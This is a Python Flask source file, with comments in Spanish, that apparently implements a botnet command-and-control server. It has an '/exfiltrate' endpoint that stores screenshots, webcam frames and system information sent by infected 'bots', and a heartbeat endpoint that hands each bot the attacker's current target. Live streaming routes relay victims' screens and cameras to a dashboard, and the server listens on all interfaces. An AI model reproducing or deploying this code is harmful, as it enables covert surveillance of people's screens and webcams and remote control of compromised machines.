from flask import Flask, request, jsonify, render_template, Response
from datetime import datetime
import os
import base64
import time

# Forzamos la ruta absoluta de los templates para evitar confusiones de Flask
base_dir = os.path.abspath(os.path.dirname(__file__))
template_dir = os.path.join(base_dir, 'templates')

app = Flask(__name__, template_folder=template_dir)
app.config['TEMPLATES_AUTO_RELOAD'] = True

# Base de datos volátil
bots = {}
current_target = None

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    data = request.json
    bot_id = data.get("bot_id", "unknown")
    
    if bot_id not in bots:
        bots[bot_id] = {"info": {}, "last_seen": "", "screenshots": [], "cam_frames": []}
    
    # Manejo de capturas
    if "screenshot" in data:
        bots[bot_id]["screenshots"].append({
            "time": datetime.now().strftime("%H:%M:%S"), 
            "data": data["screenshot"],
            "id": time.time()
        })
        bots[bot_id]["screenshots"] = bots[bot_id]["screenshots"][-5:]
    
    if "cam_frame" in data:
        bots[bot_id]["cam_frames"].append({
            "time": datetime.now().strftime("%H:%M:%S"), 
            "data": data["cam_frame"],
            "id": time.time()
        })
        bots[bot_id]["cam_frames"] = bots[bot_id]["cam_frames"][-5:]

    bots[bot_id]["info"].update(data)
    bots[bot_id]["last_seen"] = datetime.now().strftime("%H:%M:%S")
    return jsonify({"status": "acknowledged"}), 200

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    global current_target
    data = request.json
    bot_id = data.get("bot_id", "unknown")
    
    # Verificamos si ya conocemos a este bot y si tenemos su info
    is_new = bot_id not in bots
    if is_new:
        bots[bot_id] = {"info": {}, "screenshots": [], "cam_frames": []}
    
    # Si el bot existe pero no tiene info (por un reinicio), pedimos que la mande
    needs_info = is_new or not bots[bot_id]["info"]
    
    bots[bot_id]["last_seen"] = datetime.now().strftime("%H:%M:%S")
    return jsonify({
        "status": "alive", 
        "target": current_target,
        "needs_info": needs_info
    }), 200

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/bots')
def get_bots():
    return jsonify({"bots": bots, "target": current_target})

@app.route('/api/target', methods=['POST'])
def set_target():
    global current_target
    data = request.json
    current_target = data.get("target")
    return jsonify({"status": "success"})

def generate_stream(bot_id, feed_type):
    last_id = None
    while True:
        if bot_id in bots and bots[bot_id][feed_type]:
            latest = bots[bot_id][feed_type][-1]
            # Use 'id' if available, fallback to 'time'
            current_id = latest.get("id", latest["time"])
            if current_id != last_id:
                last_id = current_id
                try:
                    frame_data = base64.b64decode(latest["data"])
                    yield (b'--frame\r\n'
                           b'Content-Type: image/jpeg\r\n'
                           b'Content-Length: ' + str(len(frame_data)).encode() + b'\r\n\r\n' + 
                           frame_data + b'\r\n')
                except:
                    pass
        time.sleep(0.05)

@app.route('/stream/<bot_id>/<feed_type>')
def video_feed(bot_id, feed_type):
    if feed_type == "screen":
        target_list = "screenshots"
    elif feed_type == "cam":
        target_list = "cam_frames"
    else:
        return "Invalid feed", 400
    return Response(generate_stream(bot_id, target_list),
                    mimetype='multipart/x-mixed-replace; boundary=frame')


if __name__ == '__main__':
    # Usamos puerto 3000 y permitimos acceso externo
    app.run(host='0.0.0.0', port=3000, debug=False)
